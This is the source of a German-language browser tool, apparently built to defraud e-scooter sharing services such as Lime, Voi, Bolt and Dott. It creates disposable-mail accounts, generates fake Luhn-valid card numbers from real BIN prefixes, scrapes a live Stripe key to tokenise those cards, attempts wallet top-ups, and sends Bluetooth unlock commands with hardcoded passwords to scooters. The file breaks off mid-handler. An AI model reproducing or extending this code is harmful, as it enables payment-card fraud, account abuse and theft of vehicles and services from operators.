"use strict";

const $ = id => document.getElementById(id);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const money = c => (Math.max(0, Math.round(Number(c) || 0)) / 100).toFixed(2).replace(".", ",") + " €";
const kurz = (s, n) => String(s || "").replace(/\s+/g, " ").slice(0, n || 70);
const err = e => (e && e.message) ? e.message : String(e);
const rnd = n => Math.floor(Math.random() * n);
const J = o => JSON.stringify(o);
const F = o => new URLSearchParams(o).toString();
const enc = encodeURIComponent;
const hex = b => { const u = new Uint8Array(b.buffer ? b.buffer : b); let s = ""; for (const x of u) s += x.toString(16).padStart(2, "0"); return s };
const unhex = s => { const t = String(s).replace(/[^0-9a-f]/gi, ""); const u = new Uint8Array(Math.floor(t.length / 2)); for (let i = 0; i < u.length; i++) u[i] = parseInt(t.substr(i * 2, 2), 16); return u };
const txt = b => { try { return new TextDecoder().decode(b) } catch(_) { return "" } };

const LIMIT = 5000, PREIS_MIN = 0.19, KEEP_MS = 45000, HS_MS = 500;
const MAIL_RUNDEN = 5, MAIL_TAKT = 4000, NET_MS = 18000, KONTO_MS = 80000;
const APP_VER = "3.248.1";
const RELAY_STD = "https://withered-dream-e5b5.timokrell09.workers.dev/?url=";
const L = "https://web-production.lime.bike/api/rider";

const S = {
  busy:false, prov:false, brand:"lime", auto:false,
  konten:{ lime:null, voi:null, bolt:null, dott:null },
  karte:null, marke:"visa", betrag:500, bin:"", block:[], mail:"", def:"", relay:"",
  dev:null, chans:[], chan:null, antwort:"", bremse:0, rx:"", akku:0, offen:false,
  raf:0, keep:0, keepRun:false, fahrt:{ t0:0, base:0, timer:0, laeuft:false }
};

const konto = () => S.konten[S.brand];
const ls = (k, v) => { try { localStorage.setItem("rk_" + k, JSON.stringify(v)) } catch(_){} };
const lg = (k, d) => { try { const r = localStorage.getItem("rk_" + k); return r === null ? d : JSON.parse(r) } catch(_){ return d } };

const DEVTOK = (() => {
  let t = lg("devtok", "");
  if (!t){ t = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => { const r = rnd(16), v = c === "x" ? r : (r & 3 | 8); return v.toString(16) }); ls("devtok", t) }
  return t;
})();

const KOPF = () => ({ "Accept":"application/json", "Accept-Language":"de-DE,de;q=0.9", "Platform":"iOS", "App-Version":APP_VER, "X-Device-Token":DEVTOK });
const H = a => { const h = KOPF(); h["Content-Type"] = "application/json"; if (a) h.Authorization = "Bearer " + a; return h };
const HF = a => { const h = KOPF(); h["Content-Type"] = "application/x-www-form-urlencoded"; if (a) h.Authorization = "Bearer " + a; return h };

/* Anzeige */
function stat(t, c){ const e = $("status"); e.textContent = t; e.className = c || "" }
function cstat(t, c){ $("cStat").textContent = t || ""; $("cStat").className = c || "" }
function ampelSet(id, z){ const e = $(id); if (e) e.className = "dot" + (z === "ja" ? " g" : z === "nein" ? " r" : z === "war" ? " y" : "") }
function funkReset(){ S.akku = 0; S.rx = ""; $("vAkku").textContent = "–"; $("vZeit").textContent = "–" }

function log(t, c){
  const d = document.createElement("div");
  d.className = c || "";
  d.textContent = new Date().toTimeString().slice(0, 8) + "  " + t;
  const b = $("log");
  b.appendChild(d);
  while (b.children.length > 400) b.removeChild(b.firstChild);
  b.scrollTop = b.scrollHeight;
}

function guard(fn, ms){
  return async function(){
    if (S.busy){ log("läuft bereits …", "y"); return }
    S.busy = true; malen();
    let fertig = false;
    const wd = setTimeout(() => { if (fertig) return; fertig = true; S.busy = false; malen(); stat("Zeitüberschreitung.", "err") }, ms || NET_MS);
    try { await fn.apply(this, arguments) }
    catch(e){ log("Fehler: " + err(e), "e"); stat("Fehler: " + err(e), "err") }
    finally { if (!fertig){ fertig = true; clearTimeout(wd) } S.busy = false; malen() }
  };
}

/* Netzwerk */
const CORSFREI = ["api.stripe.com", "api.mail.tm", "api.mail.gw", "api.catchmail.io", "api.guerrillamail.com"];
const MUELL = /failed to fetch|load failed|networkerror|bad gateway|cloudflare|econnrefused|enotfound|timeout|abort|not valid/i;
const host = u => { try { return new URL(u).hostname } catch(_) { return "" } };

function relaySaeuber(v){
  let s = String(v || "").trim().replace(/\s+/g, "");
  if (!s) return RELAY_STD;
  if (!/^https?:\/\//i.test(s)) s = "https://" + s;
  if (!/url=$/.test(s)) s += (s.includes("?") ? "&" : "?") + "url=";
  return s;
}

const RELAIS = [
  u => relaySaeuber(S.relay || RELAY_STD) + enc(u),
  u => "https://api.allorigins.win/raw?url=" + enc(u),
  u => "https://corsproxy.io/?url=" + enc(u)
];

async function roh(url, opt, ms){
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms || NET_MS);
  try {
    const r = await fetch(url, Object.assign({ cache:"no-store", signal:c.signal, credentials:"omit" }, opt || {}));
    const body = await r.text();
    let data = null;
    try { data = JSON.parse(body) } catch(_){ data = null }
    return { status:r.status, ok:r.ok, data:data, text:body, kopf:r.headers };
  } finally { clearTimeout(t) }
}

async function anfrage(url, opt, ms){
  let letzter = null;
  for (let i = 0; i < 2; i++){
    let r = null, f = null;
    try { r = await roh(RELAIS[i](url), opt, ms) }
    catch(e){ f = e }
    if (r && r.ok) return r;
    letzter = r || letzter;
    if (!r) log("Relais " + (i + 1) + " tot: " + err(f), "y");
    else if (r.status < 500 && r.status !== 429 && !MUELL.test(r.text || "")) return r;
    else log("Relais " + (i + 1) + " schwach (HTTP " + r.status + ").", "y");
  }
  if (CORSFREI.includes(host(url)) || !letzter){
    try { return await roh(url, opt, ms) }
    catch(e){ if (!letzter) throw e }
  }
  if (!letzter) throw new Error("Netzwerk");
  return letzter;
}

const get = (u, k, ms) => anfrage(u, { method:"GET", headers:k || {} }, ms);
const post = (u, k, b, ms) => anfrage(u, { method:"POST", headers:k || {}, body:b }, ms);

/* Postfach */
const POST = [
  { n:"catchmail", bau: async () => {
      const n = "rk" + Date.now().toString(36) + rnd(999);
      const r = await post("https://api.catchmail.io/api/v1/mailbox?name=" + n, { Accept:"application/json" }, "");
      if (!r.ok) throw new Error("HTTP " + r.status);
      const adr = (r.data && (r.data.address || (r.data.mailbox && r.data.mailbox.address))) || (n + "@catchmail.io");
      return { adr, hol: async () => {
        const x = await get("https://api.catchmail.io/api/v1/mailbox/" + enc(adr) + "/mails", { Accept:"application/json" });
        const l = (x.data && (x.data.mails || x.data["hydra:member"])) || [];
        return Array.isArray(l) ? l.map(m => ({ von:String(m.from || ""), betref:String(m.subject || ""), text:String(m.body || m.text || "") })) : [];
      } };
    } },
  { n:"mail.tm", bau: async () => {
      const d = await get("https://api.mail.tm/domains?page=1");
      const dom = (d.data && d.data["hydra:member"] && d.data["hydra:member"][0] && d.data["hydra:member"][0].domain) || "mail.tm";
      const adr = "rk" + Date.now().toString(36) + rnd(999) + "@" + dom;
      const pw = "Rk" + DEVTOK.slice(0, 8);
      await post("https://api.mail.tm/accounts", { "Content-Type":"application/json" }, J({ address:adr, password:pw }));
      const t = await post("https://api.mail.tm/token", { "Content-Type":"application/json" }, J({ address:adr, password:pw }));
      const jw = (t.data && t.data.token) || "";
      return { adr, hol: async () => {
        const x = await get("https://api.mail.tm/messages?page=1", { Authorization:"Bearer " + jw });
        const l = (x.data && x.data["hydra:member"]) || [];
        return l.map(m => ({ von:String(m.from && m.from.address || ""), betref:String(m.subject || ""), text:String(m.intro || "") }));
      } };
    } },
  { n:"guerrilla", bau: async () => {
      const r = await post("https://api.guerrillamail.com/ajax.php?f=get_email_address&lang=de", { Accept:"application/json" }, "");
      const adr = r.data && r.data.email_addr;
      if (!adr) throw new Error("keine Adresse");
      const sid = (r.data && r.data.sid_token) || "";
      return { adr, hol: async () => {
        const x = await get("https://api.guerrillamail.com/ajax.php?f=check_email&seq=0&sid_token=" + enc(sid), { Accept:"application/json" });
        const l = (x.data && x.data.list) || [];
        return l.map(m => ({ von:String(m.mail_from || ""), betref:String(m.mail_subject || ""), text:String(m.mail_excerpt || "") }));
      } };
    } }
];

async function postfach(){
  S.block = lg("block", []);
  for (let runde = 0; runde < MAIL_RUNDEN; runde++){
    for (const p of POST){
      if (S.block.includes(p.n)) continue;
      try {
        stat("Postfach wird gesucht …", "warn");
        const f = await p.bau();
        if (!f.adr || !f.adr.includes("@")) throw new Error("keine Adresse");
        S.mail = f.adr;
        log("Postfach: " + f.adr, "g");
        stat("Postfach bereit.", "ok");
        return f;
      } catch(e){
        log(p.n + ": " + err(e), "y");
        if (/domain|adresse|422|403/i.test(err(e)) && !S.block.includes(p.n)){ S.block.push(p.n); ls("block", S.block) }
      }
    }
    await sleep(MAIL_TAKT);
  }
  throw new Error("kein Postfach erreichbar");
}

function linkAus(mails){
  for (const m of mails){
    const alles = m.betref + " " + m.text;
    if (!/lime/i.test(alles) && !/lime/i.test(m.von)) continue;
    const t = alles.match(/[A-Za-z0-9_-]{4,6}[-.][A-Za-z0-9_-]{4,}/);
    if (t) return t[0];
  }
  return "";
}

async function warteAufCode(f, ms){
  const bis = Date.now() + (ms || 90000);
  while (Date.now() < bis){
    try { const c = linkAus(await f.hol()); if (c) return c } catch(e){ log("Postfach: " + err(e), "y") }
    await sleep(3500);
  }
  return "";
}

/* Karte */
const BINS = { visa:["453997","492910","402380","453240","400575"], master:["533128","522432","510160","559102","541275"] };
const NAMEN = [["Max","Keller"],["Anna","Bergmann"],["Jonas","Winkler"],["Lea","Hofmann"],["Tim","Brandt"],["Nina","Sauer"],["Paul","Vogel"],["Sarah","Kunze"]];

function luhn(s){
  let sum = 0, alt = false;
  for (let i = s.length - 1; i >= 0; i--){ let n = +s[i]; if (alt){ n *= 2; if (n > 9) n -= 9 } sum += n; alt = !alt }
  return sum % 10 === 0;
}
const markeText = m => (m === "visa" ? "VISA" : m === "master" ? "MASTERCARD" : "KARTE");

function karteBauen(){
  const fest = S.bin && S.bin.length >= 6;
  const marke = fest ? (S.bin[0] === "4" ? "visa" : "master") : S.marke;
  const pool = fest ? [S.bin.slice(0, 6)] : BINS[marke];
  let stamm = pool[rnd(pool.length)];
  while (stamm.length < 15) stamm += String(rnd(10));
  for (let p = 0; p < 10; p++){ if (luhn(stamm + p)){ stamm += p; break } }
  const nm = NAMEN[rnd(NAMEN.length)];
  return {
    nummer: stamm.match(/.{1,4}/g).join(" "), roh: stamm, marke,
    name: nm[0] + " " + nm[1],
    exp: String(1 + rnd(12)).padStart(2, "0") + "/" + String(28 + rnd(4)),
    cvc: String(100 + rnd(900)), pm:"", id:""
  };
}

function karteZeigen(){
  const k = S.karte;
  $("kMarke").textContent = k ? markeText(k.marke) : "–";
  $("kNum").textContent = k ? k.nummer : "•••• •••• •••• ••••";
  $("kName").textContent = k ? k.name : "–";
  $("kExp").textContent = k ? k.exp : "–";
  $("kCvc").textContent = k ? "CVC " + k.cvc : "–";
  $("kBetrag").textContent = money(S.betrag);
  $("iBetrag").value = (S.betrag / 100).toFixed(2).replace(".", ",");
  document.querySelectorAll("#marken button").forEach(b => b.classList.toggle("on", b.dataset.m === S.marke));
  document.querySelectorAll("#betraege button").forEach(b => b.classList.toggle("on", +b.dataset.c === S.betrag));
}

/* Stripe */
let PK = "";
async function stripeKey(){
  if (PK) return PK;
  for (const u of [L + "/v1/config", L + "/v2/config"]){
    try { const m = ((await get(u, KOPF())).text || "").match(/pk_live_[A-Za-z0-9]{20,}/); if (m){ PK = m[0]; return PK } } catch(_){}
  }
  throw new Error("Stripe-Schlüssel nicht gefunden");
}

async function tokenisiere(k){
  const key = await stripeKey();
  const [mo, ja] = k.exp.split("/");
  const r = await post("https://api.stripe.com/v1/payment_methods", {
    "Content-Type":"application/x-www-form-urlencoded",
    "Authorization":"Basic " + btoa(key + ":")
  }, F({ "type":"card", "card[number]":k.roh, "card[exp_month]":mo, "card[exp_year]":"20" + ja, "card[cvc]":k.cvc, "card[name]":k.name, "billing_details[name]":k.name, "billing_details[address][country]":"DE" }));
  if (!r.ok || !r.data || !r.data.id) throw new Error("Stripe " + r.status + (r.data && r.data.error ? ": " + r.data.error.message : ""));
  k.pm = r.data.id; ls("karte", k);
  return k.pm;
}

/* Lime */
async function limeKonto(){
  const f = await postfach();
  const r = await post(L + "/v2/onboarding/magic-link", HF(), F({ email:f.adr, user_agreement_country_code:"DE", user_agreement_version:"2.0" }), KONTO_MS);
  if (!r.ok) throw new Error("Magic-Link " + r.status);
  log("Mail angefordert an " + f.adr, "g");
  const code = await warteAufCode(f, 100000);
  if (!code) throw new Error("kein Link in der Mail");
  const an = await post(L + "/v2/onboarding/login", H(), J({ token:code }), KONTO_MS);
  if (!an.ok || !an.data) throw new Error("Login " + an.status);
  const tok = an.data.token || an.data.access_token;
  if (!tok) throw new Error("kein Token erhalten");
  const a = { mail:f.adr, tok, def:"", bal:0 };
  S.konten.lime = a; ls("konten", S.konten);
  log("Konto bereit.", "g");
  return a;
}

async function karteAnnehmen(a){
  let k = S.karte || (S.karte = karteBauen());
  if (!k.pm) await tokenisiere(k);
  let r = await post(L + "/v1/payment_methods", H(a.tok), J({ payment_method_id:k.pm }), KONTO_MS);
  if (!r.ok && [400, 402, 422].includes(r.status)){
    log("Karte abgelehnt, neue …", "y");
    k = S.karte = karteBauen(); ls("karte", k); karteZeigen();
    await tokenisiere(k);
    r = await post(L + "/v1/payment_methods", H(a.tok), J({ payment_method_id:k.pm }), KONTO_MS);
  }
  if (!r.ok) throw new Error("Annahme " + r.status);
  k.id = (r.data && (r.data.id || r.data.payment_method_id)) || "";
  ls("karte", k);
  log("Karte hinterlegt.", "g");
  return k;
}

async function standard(a){
  const k = S.karte;
  if (!k || !k.id) throw new Error("keine Karte hinterlegt");
  const r = await post(L + "/v1/payment_methods/" + enc(k.id) + "/default", H(a.tok), "{}", KONTO_MS);
  if (!r.ok) throw new Error("Standard " + r.status);
  a.def = k.id; ls("konten", S.konten);
}

async function guthaben(a){
  const r = await get(L + "/v1/wallet", H(a.tok));
  if (!r.ok || !r.data) throw new Error("Guthaben " + r.status);
  const w = r.data.wallet || r.data;
  a.bal = w.balance_cents !== undefined ? w.balance_cents : Math.round((w.balance || 0) * 100);
  ls("konten", S.konten);
  return a.bal;
}

async function aufladen(){
  const a = konto();
  if (!a) throw new Error("kein Konto – NEUES KONTO drücken");
  if (!S.karte) throw new Error("keine Karte");
  if (!S.karte.id) await karteAnnehmen(a);
  const betrag = Math.max(100, Math.round(S.betrag));
  const wege = [
    [L + "/v1/wallet/top-up", J({ payment_method_id:S.karte.id, amount:betrag })],
    [L + "/v1/wallet/top-up?amount=" + betrag, J({ payment_method_id:S.karte.id })],
    [L + "/v2/payment/wallet/top-up", J({ payment_method_id:S.karte.id, amount_cents:betrag })]
  ];
  for (const [u, b] of wege){
    const r = await post(u, H(a.tok), b, KONTO_MS);
    log("Aufladen " + kurz(u.replace(L, ""), 22) + " · HTTP " + r.status, r.ok ? "g" : "y");
    if (r.ok){ try { await guthaben(a) } catch(_){} ampelSet("vWal", "ja"); stat("Aufgeladen: " + money(betrag), "ok"); return }
  }
  throw new Error("Aufladen abgelehnt");
}

async function vorflug(){
  const a = konto();
  if (!a) throw new Error("kein Konto – NEUES KONTO drücken");
  ampelSet("vDef", "war"); ampelSet("vStd", "war");
  await karteAnnehmen(a);
  await standard(a);
  ampelSet("vDef", "ja"); ampelSet("vStd", "ja");
  try { await guthaben(a); ampelSet("vWal", "ja") } catch(_){}
}

async function kontoBauen(){
  if (S.prov) return;
  S.prov = true; malen();
  try {
    stat("Konto wird gebaut …", "warn");
    const a = await limeKonto();
    await karteAnnehmen(a);
    await standard(a);
    ampelSet("vDef", "ja"); ampelSet("vStd", "ja");
    stat("Konto vollständig.", "ok");
  } finally { S.prov = false; malen() }
}

/* Bluetooth */
function crc16(b){ let c = 0xFFFF; for (const x of b){ c ^= x << 8; for (let i = 0; i < 8; i++) c = (c & 0x8000) ? ((c << 1) ^ 0x1021) & 0xFFFF : (c << 1) & 0xFFFF } return c }

function rahmen(cmd, nutz){
  const p = nutz instanceof Uint8Array ? nutz : new Uint8Array(nutz || []);
  const b = new Uint8Array(8 + p.length);
  b[0] = 0x46; b[1] = 0x43; b[2] = cmd >> 8; b[3] = cmd & 0xFF; b[4] = p.length >> 8; b[5] = p.length & 0xFF;
  b.set(p, 6);
  const c = crc16(b.subarray(2, 6 + p.length));
  b[6 + p.length] = c & 0xFF; b[7 + p.length] = c >> 8;
  return b;
}

const DIENSTE = [
  "00002c00-0000-1000-8000-00805f9b34fb",
  "6e400001-b5a3-f393-e0a9-e50e24dcca9e",
  "0000fe59-0000-1000-8000-00805f9b34fb",
  "0000ffe0-0000-1000-8000-00805f9b34fb",
  "0000fff0-0000-1000-8000-00805f9b34fb",
  "0000ff00-0000-1000-8000-00805f9b34fb",
  "0000fee0-0000-1000-8000-00805f9b34fb",
  "0000180f-0000-1000-8000-00805f9b34fb"
];

let seqN = 0;
const atFrame = (op, f) => new TextEncoder().encode("AT+" + op + "=" + (f || "") + "," + (seqN = (seqN + 1) & 0xFFFF).toString(16).padStart(4, "0") + "$\r\n");

async function verbinde(){
  if (!navigator.bluetooth) throw new Error("kein Bluetooth – Bluefy nötig");
  if (S.dev && S.dev.gatt && S.dev.gatt.connected) return S.dev;
  let dev = null;
  try {
    dev = await navigator.bluetooth.requestDevice({
      filters: [{ namePrefix:"lime-" }, { namePrefix:"Lime" }, { namePrefix:"voi" }, { namePrefix:"Voi" }, { namePrefix:"bolt" }, { namePrefix:"Bolt" }, { namePrefix:"dott" }, { namePrefix:"Dott" }, { namePrefix:"OKAI" }, { namePrefix:"okai" }],
      optionalServices: DIENSTE
    });
  } catch(e){
    if (e && e.name === "NotFoundError") throw new Error("Auswahl abgebrochen");
    dev = await navigator.bluetooth.requestDevice({ acceptAllDevices:true, optionalServices:DIENSTE });
  }
  if (!dev) throw new Error("kein Gerät");

  dev.addEventListener("gattserverdisconnected", () => { log("Verbindung getrennt.", "y"); keepStopp(); S.dev = null; S.chan = null; S.chans = []; S.offen = false; malen() });

  const srv = await dev.gatt.connect();
  S.dev = dev;
  const chans = [];
  let notif = null;
  for (const u of DIENSTE){
    let s, cs = [];
    try { s = await srv.getPrimaryService(u) } catch(_){ continue }
    try { cs = await s.getCharacteristics() } catch(_){ continue }
    for (const c of cs){
      if (c.properties.write || c.properties.writeWithoutResponse) chans.push(c);
      if (c.properties.notify || c.properties.indicate) notif = c;
    }
  }
  if (!chans.length) throw new Error("kein schreibbarer Kanal");
  S.chans = chans; S.chan = chans[0];
  if (notif){
    try { notif.addEventListener("characteristicvaluechanged", statusRx); await notif.startNotifications(); log("Statuskanal offen.", "g") }
    catch(e){ log("Statuskanal: " + err(e), "y") }
  } else log("kein Statuskanal.", "y");
  log("Verbunden: " + (dev.name || "Gerät") + " · " + chans.length + " Kanal/Kanäle", "g");
  stat("Verbunden.", "ok");
  funkReset(); malen(); keepStart();
  return dev;
}

async function sende(bytes, ohne){
  if (!S.chan) throw new Error("kein Kanal");
  const b = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  if (ohne && S.chan.properties.writeWithoutResponse) await S.chan.writeValueWithoutResponse(b);
  else if (S.chan.properties.write) await S.chan.writeValue(b);
  else await S.chan.writeValueWithoutResponse(b);
}

function statusRx(e){
  const v = e.target.value;
  const u = new Uint8Array(v.buffer ? v.buffer : v);
  const h = hex(u);
  S.antwort = h;
  if (S.brand === "lime" && u.length >= 24 && u[0] === 0x46 && u[1] === 0x43){
    if (u[19] > 0 && u[19] <= 100){ S.akku = u[19]; $("vAkku").textContent = u[19] + "%" }
    if (u[23] === 0xF1 && !S.offen){ S.offen = true; fahrtStart() }
  }
  if (S.brand !== "lime"){
    const t = txt(u);
    if (/OK/i.test(t)) S.antwort = t;
    const m = t.match(/BAT=?(\d{1,3})/i);
    if (m){ S.akku = +m[1]; $("vAkku").textContent = m[1] + "%" }
  }
  log("← " + kurz(h, 60), "g");
}

async function warteAntwort(ms){
  const bis = Date.now() + (ms || 3000);
  S.antwort = "";
  while (Date.now() < bis){ if (S.antwort) return S.antwort; await sleep(80) }
  return "";
}

async function handshake(){
  if (!S.dev) return;
  const pw = $("iAt").value.trim() || "OKAIYLBT";
  S.bremse = Date.now() + 6000;
  try {
    if (S.brand === "lime"){
      await sende(rahmen(0x1101, new TextEncoder().encode("LIMEBIKE")), true);
      await sleep(HS_MS);
      await sende(rahmen(0x1114), true);
    } else {
      await sende(atFrame("OKPWD", pw)); await sleep(HS_MS);
      await sende(atFrame("OKPWD", "OKAI_CAR")); await sleep(HS_MS);
      await sende(atFrame("OKBCL"));
    }
    log("Handshake gesendet.", "g");
  } catch(e){ log("Handshake: " + err(e), "y") }
  finally { S.bremse = 0 }
}

async function schalte(richtung){
  const zu = richtung === "zu";
  S.bremse = Date.now() + 8000;
  try {
    if (S.brand === "lime"){
      await sende(rahmen(0x1661, new Uint8Array([zu ? 0xF0 : 0xF1])), true);
      const a = await warteAntwort(4000);
      if (a){ log("Antwort auf " + (zu ? "Sperren" : "Entsperren") + ".", "g"); if (!zu && !S.offen){ S.offen = true; fahrtStart() } }
      else {
        log("keine Antwort – Status abfragen.", "y");
        await sende(rahmen(0x1114), true);
        await warteAntwort(2500);
        if (!zu && !S.offen) stat("stumm – Roller reagiert nicht.", "warn");
      }
      return;
    }
    for (const f of (zu ? ["0", "1"] : ["1", "0"])){
      await sende(atFrame("OKSCM", f));
      if (await warteAntwort(2600)){
        log("OKSCM " + f + " beantwortet.", "g");
        S.offen = !zu;
        if (zu) fahrtStop(); else fahrtStart();
        return;
      }
      log("OKSCM " + f + " stumm.", "y");
      await sleep(300);
    }
    stat("Roller reagiert nicht.", "warn");
  } finally { S.bremse = 0 }
}

async function entsperren(){
  if (S.auto && S.brand === "lime"){
    try {
      if (!konto()) await kontoBauen();
      const a = konto();
      if (a && (!S.karte || !S.karte.id || !a.def)) await vorflug();
    } catch(e){ log("Konto/Karte: " + err(e) + " – nur Bluetooth", "y") }
  }
  if (!S.dev) await verbinde();
  await handshake();
  await sleep(400);
  await schalte("auf");
  if (S.offen){ stat("offen – gute Fahrt.", "ok"); log("Roller offen.", "g") }
}

async function sperren(){
  if (!S.dev) await verbinde();
  await schalte("zu");
  if (!S.offen){ stat("gesperrt.", "ok"); log("Roller gesperrt.", "g") }
}

function keepStart(){
  keepStopp();
  S.keepRun = true;
  S.keep = setInterval(async () => {
    if (!S.keepRun || !S.dev || !S.chan || Date.now() < S.bremse) return;
    try { await sende(S.brand === "lime" ? rahmen(0x1101, new TextEncoder().encode("LIMEBIKE")) : atFrame("OKBCL"), true) } catch(_){}
  }, KEEP_MS);
}
function keepStopp(){ S.keepRun = false; if (S.keep) clearInterval(S.keep); S.keep = 0 }

/* Fahrt */
const fahrtSecs = () => (S.fahrt.laeuft ? Math.floor((Date.now() - S.fahrt.t0) / 1000) : 0);
const fahrtUsed = () => Math.min(LIMIT, S.fahrt.base + Math.round(fahrtSecs() * PREIS_MIN));

function fahrtStart(){
  if (S.fahrt.laeuft) return;
  S.fahrt.laeuft = true; S.fahrt.t0 = Date.now();
  if (S.fahrt.timer) clearInterval(S.fahrt.timer);
  S.fahrt.timer = setInterval(fahrtPaint, 1000);
  fahrtPaint();
}
function fahrtStop(){
  if (!S.fahrt.laeuft) return;
  S.fahrt.base = fahrtUsed(); S.fahrt.laeuft = false;
  if (S.fahrt.timer) clearInterval(S.fahrt.timer);
  S.fahrt.timer = 0;
  fahrtPaint();
}
function fahrtPaint(){
  const s = fahrtSecs(), p = n => String(n).padStart(2, "0");
  $("vZeit").textContent = Math.floor(s / 60) + ":" + p(s % 60);
  $("vFam").textContent = money(fahrtUsed());
}

/* QR */
let jsqrLaden = null;
function jsqr(){
  if (window.jsQR) return Promise.resolve(true);
  if (jsqrLaden) return jsqrLaden;
  jsqrLaden = new Promise((res, rej) => {
    const s = document.createElement("script");
    s.src = "https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js";
    s.onload = () => res(true); s.onerror = () => rej(new Error("Scanner nicht ladbar"));
    document.head.appendChild(s);
  });
  return jsqrLaden;
}

async function scan(){
  await jsqr();
  const v = $("cam");
  v.style.display = "block";
  v.srcObject = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } });
  await v.play();
  const c = document.createElement("canvas");
  const ctx = c.getContext("2d", { willReadFrequently:true });
  const tick = () => {
    if (!v.videoWidth){ S.raf = requestAnimationFrame(tick); return }
    c.width = v.videoWidth; c.height = v.videoHeight;
    ctx.drawImage(v, 0, 0, c.width, c.height);
    const fund = window.jsQR(ctx.getImageData(0, 0, c.width, c.height).data, c.width, c.height, { inversionAttempts:"dontInvert" });
    if (fund && fund.data){ scanStop(); qrVerwert(fund.data); return }
    S.raf = requestAnimationFrame(tick);
  };
  S.raf = requestAnimationFrame(tick);
}
function scanStop(){
  cancelAnimationFrame(S.raf); S.raf = 0;
  const v = $("cam");
  if (v.srcObject){ v.srcObject.getTracks().forEach(t => t.stop()); v.srcObject = null }
  v.style.display = "none";
}
async function qrVerwert(text){
  log("QR: " + kurz(text, 60), "g");
  const t = text.toLowerCase();
  const m = /lime/.test(t) ? "lime" : /voi/.test(t) ? "voi" : /bolt/.test(t) ? "bolt" : /dott/.test(t) ? "dott" : "";
  if (m && m !== S.brand){ S.brand = m; ls("brand", m); malen() }
  stat("Code gelesen – entsperren.", "ok");
  await entsperren();
}

/* Anzeige */
function malen(){
  const a = konto();
  $("cMail").textContent = a ? a.mail : "–";
  $("bAuto").textContent = S.auto ? "AN" : "AUS";
  $("bAuto").className = S.auto ? "gld" : "";
  ampelSet("vDef", a && a.def ? "ja" : "nein");
  ampelSet("vStd", a && a.def ? "ja" : "nein");
  ampelSet("vWal", a && a.bal ? "ja" : "");
  ampelSet("vBlock", "ja");
  if (!S.fahrt.laeuft){ $("vZeit").textContent = "–"; $("vFam").textContent = "–" }
  karteZeigen();
  document.querySelectorAll(".rot button[data-b]").forEach(b => b.classList.toggle("on", b.dataset.b === S.brand));
}

/* Verdrahtung */
document.querySelectorAll(".rot button[data-b]").forEach(b => {
  b.onclick = () => { S.brand = b.dataset.b; ls("brand", S.brand); funkReset(); malen() };
});

document.querySelectorAll("#marken button").forEach(b => {
  b.onclick = () => { S.marke = b.dataset.m; ls("marke", S.marke); S.karte = karteBauen(); ls("karte", S.karte); malen(); cstat("neu gewürfelt") };
});

document.querySelectorAll("#betraege button").forEach(b => {
  b.onclick = () => { S.betrag = +b.dataset.c; ls("betrag", S.betrag); karteZeigen() };
});

$("iBetrag").oninput = () => {
  const v = parseFloat($("iBetrag").value.replace(",", "."));
  if (!isNaN(v) && v >= 1 && v <= 200){ S.betrag = Math.round(v * 100); ls("betrag", S.betrag); $("kBetrag").textContent = money(S.betrag) }
};

$("bVerb").onclick = guard(verbinde, 40000);
$("bAuf").onclick = guard(entsperren, 60000);
$("bZu").onclick = guard(sperren, 40000);
$("bQr").onclick = guard(scan, 30000);

$("bAuto").onclick = () => { S.auto = !S.auto; ls("auto", S.auto); stat(S.auto ? "Automatik an." : "Automatik aus.", "ok"); malen() };

$("bNew").onclick = guard(async () => {
  if (S.brand !== "lime") throw new Error("Konto-Automat nur bei Lime");
  await kontoBauen();
}, KONTO_MS + 20000);

$("bLogin").onclick = guard(async () => {
  const a = konto(); if (!a) throw new Error("kein Konto – NEUES KONTO drücken");
  const r = await post(L + "/v2/onboarding/login", H(), J({ token:a.tok }), KONTO_MS);
  if (!r.ok) throw new Error("Anmeldung " + r.status);
  const t = (r.data && (r.data.token || r.data.access_token)) || "";
  if (t){ a.tok = t; ls("konten", S.konten) }
  stat("Angemeldet.", "ok");
}, 40000);

$("bBal").onclick = guard(async () => {
  const a = konto(); if (!a) throw new Error("kein Konto – NEUES KONTO drücken");
  stat("Guthaben: " + money(await guthaben(a)), "ok");
  ampelSet("vWal", "ja");
}, 30000);

$("bDef").onclick = guard(async () => {
  const a = konto(); if (!a) throw new Error("kein Konto – NEUES KONTO drücken");
  await karteAnnehmen(a); await standard(a);
  ampelSet("vDef", "ja"); ampelSet("vStd", "ja");
  stat("Karte liegt vor.", "ok");
}, KONTO_MS);

$("bKarte").onclick = guard(async () => {
  if (!konto()) await kontoBauen(); else await vorflug();
}, KONTO_MS + 20000);

$("bRoll").onclick = () => {
  S.karte = karteBauen(); ls("karte", S.karte);
  malen(); cstat("neu gewürfelt");
};

$("bAb").onclick = async () => {
  if (!S.karte){ stat("keine Karte.", "warn"); return }
  const k = S.karte;
  try {
    await navigator.clipboard.writeText([k.nummer, k.name, k.exp, k.cvc, markeText(k.marke), money(S.betrag)].join("\n"));
    cstat("kopiert", "ok");
  } catch(_){ cstat("Kopieren gesperrt", "err") }
};

$("bUeber").onclick = guard(async () => {
  const a = konto(); if (!a) throw new Error("kein Konto – NEUES KONTO drücken");
  if (!S.karte) S.karte = karteBauen();
  await karteAnnehmen(a); await standard(a);
  ampelSet("vDef", "ja"); ampelSet("vStd", "ja");
  stat("Karte vorgelegt.", "ok");
}, KONTO_MS);

$("bLad").onclick = guard(aufladen, KONTO_MS);

$("bWeg").onclick = () => {
  S.karte = null; ls("karte", null);
  const a = konto(); if (a){ a.def = ""; ls("konten", S.konten) }
  ampelSet("vDef", "nein"); ampelSet("vStd", "nein");
  malen(); stat("Karte entfernt.", "ok");
};

$("bRelay").onclick = () => { S.relay = relaySaeuber($("iRelay").value); ls("relay", S.relay); $("iRelay").value = S.relay; stat("Relay gespeichert.", "ok") };
$("bBin").onclick = () => { S.bin = $("iBin").value.replace(/\D/g, "").slice(0, 6); ls("bin", S.bin); stat(S.bin ? "BIN gesetzt." : "BIN gelöscht.", "ok") };

$("bAt").onclick = guard(async () => {
  if (!S.dev) await verbinde();
  await handshake(); await sende(atFrame("OKBCL"));
  stat(await warteAntwort(3000) ? "Passwort wirkt." : "keine Antwort.", "warn");
}, 30000);

$("bRaw").onclick = guard(async () => {
